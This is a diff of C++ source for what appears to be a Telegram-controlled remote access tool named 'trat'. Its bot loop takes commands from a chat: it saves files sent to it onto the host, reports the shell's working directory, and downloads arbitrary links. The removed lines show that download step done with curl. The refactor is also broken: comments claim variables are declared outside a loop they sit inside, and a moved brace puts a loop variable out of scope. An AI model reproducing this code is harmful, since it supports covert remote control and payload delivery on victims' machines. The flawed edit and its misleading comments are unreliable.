@@ -1,4 +1,3 @@
-
 #include "../../include/bot.hpp"
 
 namespace trat
@@ -8,10 +7,12 @@ namespace trat
         int offset = -1;
         telebot_update_type_e update_types[] = {TELEBOT_UPDATE_TYPE_MESSAGE};
         telebot_error_e ret;
+        
         while (true)
         {
-            telebot_update_t* updates;
-            int count;
+            telebot_update_t* updates = nullptr; // Declare outside the loop
+            int count = 0; // Declare outside the loop
+            
             ret = telebot_get_updates(handle, offset, 20, 0, update_types, 1, &updates, &count);
             if (ret != TELEBOT_ERROR_NONE)
             {
@@ -31,51 +32,31 @@ namespace trat
                         if (message.document)
                         {
                             const auto& document = message.document;
-                            auto fileId = document -> file_id;
-                            auto fileName = document -> file_name;
+                            auto fileId = document->file_id;
+                            auto fileName = document->file_name;
                             std::thread([this, fileId, fileName]() {
-                                    this -> downloadFromChat(fileId, fileName);
-                                }).detach();
-
+                                this->downloadFromChat(fileId, fileName);
+                            }).detach();
                         }
-                        
                         else
                         {
                             if (strstr(message.text, "/pwd"))
                             {
                                 std::thread([this]() {
-                                    this->sendMessage(( this -> shell).getCurrentPath());
+                                    this->sendMessage((this->shell).getCurrentPath());
                                 }).detach();
                             }
 
-
-                            else if (auto link = extractDownloadLink(message.text))
-                            {
-                                std::thread([this, link = std::move(link)]() 
-                                    {
-
-                                        auto networking_response = trat::curlDownload(link, constructFilePath(link));
-                                        char message_buffer[256];
-                                        if (networking_response.isSuccessful)
-                                        {
-                                            snprintf(message_buffer, sizeof(message_buffer), "Download completed in %f",  networking_response.timeInSeconds);   
-                                        }
-                                        else
-                                        {
-                                            snprintf(message_buffer, sizeof(message_buffer), "DownloadFailed: %s",  networking_response.errorLog);
-                                        }
-                                        this->sendMessage(message_buffer);
-                                    }).detach();
-                            }
+                            this->handleDownloadCommand(message.text);
                         }
                     }
-
+                }
                 // Update the offset to the latest update ID
                 offset = updates[i].update_id + 1;
-                }
             }
+
             // Release the memory allocated for updates
-            telebot_put_updates(updates, count);
+            telebot_put_updates(updates, count); // Now `updates` and `count` are in scope
         }
     }
 }
